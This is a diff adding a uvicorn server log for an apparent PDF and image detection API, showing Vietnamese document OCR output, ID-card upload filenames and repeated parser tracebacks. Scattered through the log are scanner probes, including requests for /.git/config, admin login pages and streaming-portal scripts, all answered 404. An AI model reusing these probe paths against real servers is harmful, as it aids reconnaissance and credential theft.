+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     141.255.166.2:43398 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.186:61572 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:53875 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd 2.jpg
+INFO:     123.24.206.26:36884 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd 2.jpg
+INFO:     123.24.206.26:43953 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd 3.jpg
+INFO:     123.24.206.26:59972 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd 3.jpg
+INFO:     123.24.206.26:58815 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:57901 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:38842 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:38630 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd 3.jpg
+INFO:     123.24.206.26:42863 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd 3.jpg
+INFO:     123.24.206.26:46379 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd 3.jpg
+INFO:     123.24.206.26:46282 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:56328 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:47546 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:42535 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:46019 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:40792 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:57965 - "POST /detect_pdf HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:34953 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:33826 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:65209 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd 3.jpg
+INFO:     123.24.206.26:60643 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:57064 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:51961 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:53959 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:62476 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:39864 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:60108 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:49907 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:54368 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:59449 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:40621 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     205.210.31.13:62786 - "GET / HTTP/1.1" 404 Not Found
+LSD_101-1.jpg
+INFO:     123.24.206.26:40441 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:52702 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:43298 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:36047 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:45903 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:36034 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:45627 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd 3.jpg
+INFO:     123.24.206.26:35915 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:43950 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:45313 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     141.255.166.2:38822 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     141.255.166.2:53928 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.154:57808 - "GET / HTTP/1.1" 404 Not Found
+INFO:     43.158.217.52:40686 - "GET / HTTP/1.1" 404 Not Found
+INFO:     141.255.166.2:35606 - "GET / HTTP/1.1" 404 Not Found
+INFO:     172.173.240.111:42472 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     167.248.133.63:39686 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+INFO:     123.24.206.26:50343 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.24:58968 - "GET / HTTP/1.1" 404 Not Found
+INFO:     71.6.232.23:51196 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.133:63254 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.23:58118 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.168:61088 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:33545 - "GET /Portal/Portal.mwsl HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:37215 - "GET /__Additional HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:44691 - "GET /docs/cplugError.html/ HTTP/1.1" 404 Not Found
+INFO:     205.210.31.21:49588 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     23.224.186.225:47876 - "GET / HTTP/1.1" 404 Not Found
+INFO:     23.224.186.225:50300 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     23.224.186.225:50670 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     23.224.186.225:50976 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     185.165.190.17:33154 - "GET / HTTP/1.1" 404 Not Found
+INFO:     185.165.190.17:34562 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     87.236.176.82:43477 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+123123zxczxc.png
+INFO:     123.24.206.26:54316 - "POST /detect_pdf HTTP/1.1" 200 OK
+PSPDFKit_Quickstart_Guide2.pdf
+INFO:     123.24.206.26:55716 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     123.24.206.26:53112 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:64117 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     123.24.206.26:35821 - "OPTIONS /detect_pdf HTTP/1.1" 200 OK
+INFO:     123.24.206.26:43635 - "POST /detect_pdf HTTP/1.1" 422 Unprocessable Entity
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     185.165.190.34:43774 - "GET / HTTP/1.1" 404 Not Found
+INFO:     185.165.190.34:45206 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     24.199.85.177:39362 - "HEAD / HTTP/1.0" 404 Not Found
+INFO:     24.199.85.177:39512 - "GET /system_api.php HTTP/1.1" 404 Not Found
+INFO:     24.199.85.177:55376 - "GET /c/version.js HTTP/1.1" 404 Not Found
+INFO:     24.199.85.177:57212 - "GET /streaming/clients_live.php HTTP/1.1" 404 Not Found
+INFO:     24.199.85.177:35816 - "GET /stalker_portal/c/version.js HTTP/1.1" 404 Not Found
+INFO:     24.199.85.177:42340 - "GET /stream/live.php HTTP/1.1" 404 Not Found
+INFO:     24.199.85.177:46752 - "GET /flu/403.html HTTP/1.1" 404 Not Found
+INFO:     24.199.85.177:43254 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:64145 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:38991 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:49979 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:59758 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:56939 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:64881 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:37616 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:43325 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:54873 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:53177 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:49814 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:54863 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:48294 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:37477 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:46404 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:35709 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:39228 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:40667 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:56011 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:53497 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:61645 - "GET / HTTP/1.1" 404 Not Found
+INFO:     185.180.143.80:36224 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     35.195.93.98:53416 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.178:60058 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.2:57874 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.248.133.47:56258 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+INFO:     123.24.206.26:41515 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     18.170.228.104:40888 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     18.170.228.104:40898 - "GET /manage/account/login HTTP/1.1" 404 Not Found
+INFO:     18.170.228.104:58620 - "GET /admin/index.html HTTP/1.1" 404 Not Found
+INFO:     18.170.228.104:58624 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     18.170.228.104:58630 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.141:64462 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:58263 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:57181 - "GET /openapi.json HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:44948 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     198.235.24.169:57590 - "GET / HTTP/1.1" 404 Not Found
+INFO:     35.233.62.116:36646 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.23:62986 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.154:64614 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.23:64330 - "GET / HTTP/1.1" 404 Not Found
